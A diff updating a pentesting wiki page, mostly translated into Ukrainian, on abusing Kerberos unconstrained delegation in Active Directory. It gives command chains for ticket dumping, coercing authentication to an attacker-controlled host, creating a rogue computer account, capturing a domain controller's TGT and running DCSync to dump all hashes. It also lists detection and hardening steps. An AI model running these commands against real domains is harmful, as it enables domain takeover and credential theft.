@@ -4,11 +4,11 @@
 
 ## Unconstrained delegation
 
-Це функція, яку Domain Administrator може встановити для будь-якого **Computer** всередині domain. Після цього, щоразу, коли **user logins** на Computer, **копія TGT** цього user буде **надіслана всередині TGS**, наданого DC, і **збережена в memory в LSASS**. Тож, якщо у вас є Administrator privileges на машині, ви зможете **dump the tickets і impersonate the users** на будь-якій машині.
+Це функція, яку Domain Administrator може налаштувати для будь-якого **Computer** у домені. Після цього щоразу, коли **user logins** на цей Computer, **копія TGT** цього користувача буде **надіслана всередині TGS**, наданого DC, **і збережена в пам’яті LSASS**. Отже, якщо ви маєте привілеї Administrator на цій машині, ви зможете **dump квитків та impersonate користувачів** на будь-якій машині.
 
-Тому якщо domain admin logins на Computer із увімкненою функцією "Unconstrained Delegation", і у вас є local admin privileges на цій машині, ви зможете dump the ticket і impersonate Domain Admin будь-де (domain privesc).
+Тому, якщо domain admin **logins** на Computer з активованою функцією "Unconstrained Delegation", а ви маєте локальні привілеї адміністратора на цій машині, ви зможете dump квиток і impersonate Domain Admin будь-де (domain privesc).
 
-Ви можете **знайти Computer objects з цим атрибутом**, перевіривши, чи атрибут [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) містить [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Це можна зробити за допомогою LDAP filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, і саме це робить powerview:
+Ви можете **знайти об’єкти Computer із цим атрибутом**, перевіривши, чи атрибут [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) містить [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Це можна зробити за допомогою LDAP-фільтра ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, який і використовує powerview:
 ```bash
 # List unconstrained computers
 ## Powerview
@@ -30,41 +30,41 @@ kerberos::list /export #Another way
 Rubeus.exe dump
 Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
 ```
-Load the ticket of Administrator (or victim user) in memory with **Mimikatz** or **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
-More info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
-[**More information about Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
+Завантажте ticket Administrator (або користувача-жертви) у пам’ять за допомогою **Mimikatz** або **Rubeus для** [**Pass the Ticket**](pass-the-ticket.md)**.**\
+Додаткова інформація: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
+[**Додаткова інформація про Unconstrained delegation на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>
 
 ### **Force Authentication**
 
-If an attacker is able to **compromise a computer allowed for "Unconstrained Delegation"**, he could **trick** a **Print server** to **automatically login** against it **saving a TGT** in the memory of the server.\
-Then, the attacker could perform a **Pass the Ticket attack to impersonate** the user Print server computer account.
+Якщо зловмиснику вдасться **скомпрометувати комп’ютер, для якого дозволено "Unconstrained Delegation"**, він може **обманом змусити** **Print server** **автоматично автентифікуватися** на ньому, **зберігши TGT** у пам’яті сервера.\
+Після цього зловмисник може виконати **Pass the Ticket attack для імперсонації** облікового запису комп’ютера Print server.
 
-To make a print server login against any machine you can use [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
+Щоб змусити print server автентифікуватися на будь-якій машині, можна використати [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
 ```bash
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
-Якщо TGT отримано від domain controller, ви можете виконати [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) і отримати всі хеші з DC.\
-[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
+Якщо TGT отримано від контролера домену, ви можете виконати [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) і отримати всі хеші з DC.\
+[**Більше інформації про цю атаку на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>
 
-Знайдіть тут інші способи **примусити автентифікацію:**
+Інші способи **примусити автентифікацію**:
 
 
 {{#ref}}
 printers-spooler-service-abuse.md
 {{#endref}}
 
-Будь-який інший coercion primitive, який змушує victim автентифікуватися через **Kerberos** на ваш host з unconstrained-delegation, теж підходить. У сучасних environments це часто означає заміну класичного PrinterBug flow на **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** або coercion на основі **WebClient/WebDAV** залежно від того, яка RPC surface доступна.
+Також працює будь-який інший coercion primitive, який змушує жертву автентифікуватися через **Kerberos** на ваш хост з unconstrained delegation. У сучасних середовищах це часто означає заміну класичного PrinterBug flow на **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** або coercion на основі **WebClient/WebDAV**, залежно від того, яка RPC surface доступна.
 
-### Abusing a user/service account with unconstrained delegation
+### Зловживання user/service account з unconstrained delegation
 
-Unconstrained delegation **не обмежується computer objects**. **User/service account** також може бути налаштований як `TRUSTED_FOR_DELEGATION`. У такому сценарії практична вимога полягає в тому, щоб account отримував Kerberos service tickets для **SPN, який йому належить**.
+Unconstrained delegation **не обмежується computer objects**. **User/service account** також може бути налаштований як `TRUSTED_FOR_DELEGATION`. У такому випадку практична вимога полягає в тому, що account має отримувати Kerberos service tickets для **SPN, яким він володіє**.
 
-Це приводить до 2 дуже поширених offensive path:
+Це відкриває 2 дуже поширені offensive paths:
 
-1. Ви компрометуєте password/hash **user account** з unconstrained-delegation, а потім **додаєте SPN** до цього ж account.
-2. Account уже має один або більше SPN, але один із них вказує на **застарілий/виведений з експлуатації hostname**; відновлення відсутнього **DNS A record** достатньо, щоб перехопити authentication flow без зміни набору SPN.
+1. Ви компрометуєте пароль/хеш **user account** з unconstrained delegation, а потім **додаєте SPN** до цього самого account.
+2. Account уже має один або кілька SPN, але один із них вказує на **застаріле/виведене з експлуатації hostname**; повторне створення відсутнього **DNS A record** достатнє для hijack authentication flow без зміни набору SPN.<sup>[[8]](#references)</sup>
 
-Minimal Linux flow:
+Мінімальний Linux flow:
 ```bash
 # 1) Find unconstrained-delegation users and their SPNs
 Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
@@ -90,39 +90,39 @@ python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_F
 KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
 secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
 ```
-Notes:
+Примітки:
 
-- Це особливо корисно, коли unconstrained principal є **service account** і в вас є лише його credentials, а не code execution на joined host.
-- Якщо target user уже має **stale SPN**, відтворення відповідного **DNS record** може бути менш noisy, ніж запис нового SPN у AD.
-- Recent Linux-centric tradecraft використовує `addspn.py`, `dnstool.py`, `krbrelayx.py` і один coercion primitive; вам не потрібно торкатися Windows host, щоб завершити chain.
+- Це особливо корисно, коли principal з unconstrained delegation є **service account**, а у вас є лише його credentials, але немає code execution на приєднаному до домену хості.
+- Якщо цільовий користувач уже має **stale SPN**, відтворення відповідного **DNS record** може бути менш шумним, ніж запис нового SPN в AD.
+- Сучасні Linux-centric tradecraft використовують `addspn.py`, `dnstool.py`, `krbrelayx.py` та один coercion primitive; вам не потрібно взаємодіяти з Windows-хостом, щоб завершити цей ланцюжок.
 
-### Abusing Unconstrained Delegation with an attacker-created computer
+### Зловживання Unconstrained Delegation за допомогою створеного атакувальником комп’ютера
 
-Modern domains often have `MachineAccountQuota > 0` (default 10), allowing any authenticated principal to create up to N computer objects. If you also hold the `SeEnableDelegationPrivilege` token privilege (or equivalent rights), you can set the newly created computer to be trusted for unconstrained delegation and harvest inbound TGTs from privileged systems.
+У сучасних доменах часто встановлено `MachineAccountQuota > 0` (за замовчуванням 10), що дозволяє будь-якому authenticated principal створювати до N computer objects. Якщо ви також маєте token privilege `SeEnableDelegationPrivilege` (або еквівалентні права), ви можете налаштувати щойно створений computer як trusted for unconstrained delegation і збирати вхідні TGT від привілейованих систем.<sup>[[1]](#references)</sup>
 
-High-level flow:
+Загальний flow:
 
-1) Create a computer you control
+1) Створіть computer, який контролюєте
 ```bash
 # Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
 addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
 ```
-2) Зробіть fake hostname таким, що резолвиться всередині domain
+2) Зробіть так, щоб фіктивне ім’я хоста розв’язувалося всередині домену
 ```bash
 # krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
 python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
 --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
 -dns-ip <DC_IP> <DC_FQDN>
 ```
-3) Увімкніть Unconstrained Delegation на комп’ютері, контрольованому атакувальником
+3) Увімкнути Unconstrained Delegation на комп’ютері під контролем атакувальника
 ```bash
 # Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
 # BloodyAD example
 bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
 ```
-Чому це працює: with unconstrained delegation, LSA на computer з увімкненим delegation кешує inbound TGTs. Якщо ти змусиш DC або privileged server автентифікуватися на твій fake host, його machine TGT буде збережено і can be exported.
+Чому це працює: за умови unconstrained delegation LSA на комп’ютері з увімкненою delegation кешує вхідні TGT. Якщо змусити DC або привілейований сервер автентифікуватися на вашому підробленому хості, його машинний TGT буде збережено, і його можна буде експортувати.
 
-4) Start krbrelayx in export mode and prepare the Kerberos material
+4) Запустіть krbrelayx у режимі експорту та підготуйте матеріали Kerberos
 ```bash
 # Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
 # Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
@@ -131,7 +131,7 @@ python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>
 # Alternative if you know the password and correct Kerberos salt:
 python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
 ```
-5) Примусьте аутентифікацію з DC/servers до вашого fake host
+5) Примусити DC/сервери автентифікуватися на вашому підробленому хості
 ```bash
 # netexec (CME fork) coerce_plus module supports multiple coercion vectors
 # Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
@@ -142,7 +142,7 @@ krbrelayx збереже файли ccache, коли машина автенти
 Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
 Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
 ```
-6) Використайте захоплений DC machine TGT, щоб виконати DCSync
+6) Використайте захоплений TGT машини DC для виконання DCSync
 ```bash
 # Create a krb5.conf for the realm (netexec helper)
 netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
@@ -156,37 +156,36 @@ netexec smb <DC_FQDN> --use-kcache --ntds
 KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
 secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
 ```
-Notes and requirements:
+- `MachineAccountQuota > 0` дає змогу непривілейованим користувачам створювати комп'ютери; в іншому разі потрібні явні права.
+- Встановлення `TRUSTED_FOR_DELEGATION` на комп'ютері потребує `SeEnableDelegationPrivilege` (або прав domain admin).
+- Забезпечте name resolution для вашого fake host (DNS A-запис), щоб DC міг звертатися до нього за FQDN.
+- Для coercion потрібен придатний вектор (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN тощо). Якщо можливо, вимкніть їх на DC.
+- Якщо для облікового запису-жертви встановлено **"Account is sensitive and cannot be delegated"** або він є учасником **Protected Users**, forwarded TGT не буде включено до service ticket, тому цей ланцюжок не дасть змоги отримати придатний для повторного використання TGT.<sup>[[9]](#references)</sup>
+- Якщо на клієнті/сервері, що проходить автентифікацію, увімкнено **Credential Guard**, Windows блокує **Kerberos unconstrained delegation**, через що з погляду оператора можуть не спрацювати навіть коректні coercion-шляхи.
 
-- `MachineAccountQuota > 0` enables unprivileged computer creation; otherwise you need explicit rights.
-- Setting `TRUSTED_FOR_DELEGATION` on a computer requires `SeEnableDelegationPrivilege` (or domain admin).
-- Ensure name resolution to your fake host (DNS A record) so the DC can reach it by FQDN.
-- Coercion requires a viable vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Disable these on DCs if possible.
-- If the victim account is marked as **"Account is sensitive and cannot be delegated"** or is a member of **Protected Users**, the forwarded TGT will not be included in the service ticket, so this chain won't yield a reusable TGT.
-- If **Credential Guard** is enabled on the authenticating client/server, Windows blocks **Kerberos unconstrained delegation**, which can make otherwise valid coercion paths fail from an operator perspective.
+Ідеї для виявлення та hardening:
 
-Detection and hardening ideas:
-
-- Alert on Event ID 4741 (computer account created) and 4742/4738 (computer/user account changed) when UAC `TRUSTED_FOR_DELEGATION` is set.
-- Monitor for unusual DNS A-record additions in the domain zone.
-- Watch for spikes in 4768/4769 from unexpected hosts and DC-authentications to non-DC hosts.
-- Restrict `SeEnableDelegationPrivilege` to a minimal set, set `MachineAccountQuota=0` where feasible, and disable Print Spooler on DCs. Enforce LDAP signing and channel binding.
+- Створіть сповіщення для Event ID 4741 (створення облікового запису комп'ютера) і 4742/4738 (зміна облікового запису комп'ютера/користувача), коли встановлено UAC `TRUSTED_FOR_DELEGATION`.
+- Відстежуйте незвичні додавання DNS A-записів у зоні домену.
+- Слідкуйте за сплесками 4768/4769 з неочікуваних хостів і автентифікаціями DC до хостів, які не є DC.
+- Обмежте `SeEnableDelegationPrivilege` мінімально необхідним набором облікових записів, встановіть `MachineAccountQuota=0`, де це можливо, і вимкніть Print Spooler на DC. Увімкніть LDAP signing і channel binding.
 
 ### Mitigation
 
-- Limit DA/Admin logins to specific services
-- Set "Account is sensitive and cannot be delegated" for privileged accounts.
+- Обмежте входи DA/Admin до визначених сервісів.
+- Встановіть **"Account is sensitive and cannot be delegated"** для привілейованих облікових записів.
 
 ## References
 
-- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
-- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
-- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
-- krbrelayx: https://github.com/dirkjanm/krbrelayx
-- Impacket addcomputer.py: https://github.com/fortra/impacket
-- BloodyAD: https://github.com/CravateRouge/bloodyAD
-- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
-- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
-- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group
+- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
+- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
+- [3] [ired.team – компрометація домену через unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
+- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
+- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
+- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
+- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
+- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
+- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
+- [10] [ired.team – компрометація домену через DC print server і Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
 
 {{#include ../../banners/hacktricks-training.md}}
